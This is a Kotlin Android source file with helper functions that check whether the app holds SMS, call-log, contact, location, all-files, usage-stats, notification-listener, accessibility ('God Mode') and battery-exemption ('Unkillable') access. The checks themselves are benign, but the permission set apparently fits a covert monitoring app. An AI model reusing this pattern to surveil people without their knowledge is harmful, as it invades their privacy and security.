package com.example.myandroid

import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Process
import android.provider.Settings
import android.net.Uri

object PermissionManager {

    // 1. Check Standard Runtime Permissions
    // Using generic Context to avoid AppCompat dependency
    fun getMissingRuntimePermissions(ctx: Context): List<String> {
        val required = mutableListOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS
        ).apply {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 add(android.Manifest.permission.POST_NOTIFICATIONS)
             }
             // Add legacy storage permission for Android 10 and below
             if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                 add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                 add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
             }
        }
        return required.filter {
            androidx.core.content.ContextCompat.checkSelfPermission(ctx, it) != PackageManager.PERMISSION_GRANTED
        }
    }

    // 1.5 Check All Files Access (Android 11+)
    fun hasAllFilesAccess(ctx: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            true // Handled by runtime permissions above
        }
    }

    // 2. Check Usage Stats (For Screen Time)
    fun hasUsageStats(ctx: Context): Boolean {
        val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName)
        } else {
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    // 3. Check Notification Listener (For Symbiote)
    fun hasNotificationListener(ctx: Context): Boolean {
        val enabledListeners = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
        return enabledListeners != null && enabledListeners.contains(ctx.packageName)
    }

    // 4. Check Accessibility (The God Mode)
    fun hasAccessibility(ctx: Context): Boolean {
        var accessibilityEnabled = 0
        try {
            accessibilityEnabled = Settings.Secure.getInt(ctx.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
        } catch (e: Settings.SettingNotFoundException) {
            return false
        }
        if (accessibilityEnabled == 1) {
            val services = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (services != null) {
                return services.toLowerCase().contains(ctx.packageName.toLowerCase())
            }
        }
        return false
    }
    
    // 5. Battery Optimization (Unkillable)
    fun isIgnored(ctx: Context): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            return pm.isIgnoringBatteryOptimizations(ctx.packageName)
        }
        return true
    }
}